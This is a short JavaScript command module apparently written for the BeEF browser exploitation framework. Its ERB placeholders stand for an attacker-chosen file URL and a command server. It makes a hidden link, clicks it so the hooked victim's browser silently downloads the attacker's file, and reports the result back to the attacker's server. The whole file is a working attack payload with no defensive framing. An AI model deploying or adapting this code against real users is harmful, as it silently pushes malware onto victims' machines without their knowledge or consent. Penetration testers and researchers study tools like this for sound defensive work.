beef.execute(function() {
	var maliciousurl = '<%= @malicious_file_uri %>';

	// Create a hidden download link
	var a = document.createElement('a');
	a.href = maliciousurl;
	a.download = '';
	a.style.display = 'none';
	document.body.appendChild(a);
	a.click();
	document.body.removeChild(a);

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Download triggered for: " + maliciousurl);
});
